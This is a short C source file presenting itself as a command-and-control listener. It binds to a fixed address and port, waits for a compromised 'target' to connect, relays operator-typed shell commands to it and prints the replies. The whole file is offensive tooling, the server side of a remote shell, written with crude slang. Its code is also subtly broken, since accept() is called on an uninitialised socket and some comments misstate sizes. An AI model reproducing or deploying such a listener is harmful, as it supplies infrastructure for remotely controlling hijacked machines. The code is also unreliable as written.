// -- C2 Listener of Pwnwinbl0wz
// -- Author: Emirhan Sarikaya - Ethical hacker
// -----------------------------------------
//
//    Compile with GCC:
//    gcc c2.c -o c2
//    run: ./c2
// -----------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

/* If you run the C2 listener on winblowz machine, uncomment this line below */
/* and implement it instead of bzero(); function, do it yoself skid */
/* #define fuqbillgatez(p, size) (void) memset((p), 0, (size)) */




int main(){
    int s0q, cl13nt_s0q;
    char buffer[1024]; //1gbit command
    char resp[18384];
    struct sockaddr_in C2_addr, target_addr;

    int i=0;
    int m1tnick = 1;
    socklen_t target_length;
    s0q = socket(AF_INET, SOCK_STREAM, 0);
    if(setsockopt(s0q, SOL_SOCKET, SO_REUSEADDR, &m1tnick, sizeof(m1tnick)) < 0) {
        printf("[C2-serv] fuck me, the TCP socket couldnt be set");
        return 1;
    }

    C2_addr.sin_family = AF_INET;
    C2_addr.sin_addr.s_addr = inet_addr("1.3.3.7"); // ip-addy of C2 server
    C2_addr.sin_port = htons(1337); // C2 server port listener
    bind(s0q, (struct sockaddr *) &C2_addr, sizeof(C2_addr));
    listen(s0q, 5);
    target_length = sizeof(target_addr);
    cl13nt_s0q = accept(cl13nt_s0q, (struct sockaddr *) &target_addr, &target_length);
    /* no need to use sizeof(), target_length stores sizeof(target_addr) */
    while(1) {
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&resp, sizeof(resp));
        printf("(%s)[C2-serv][shell]~> ", inet_ntoa(target_addr.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n"); // to remove \n to avoid commands gettin fucked
        write(cl13nt_s0q, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 1) == 0) {
            break;
        } else { // MSG_WAITALL blocks until full req is satisfied
            recv(cl13nt_s0q, resp, sizeof(resp), MSG_WAITALL);
            printf("%s", resp);
        }
    }
}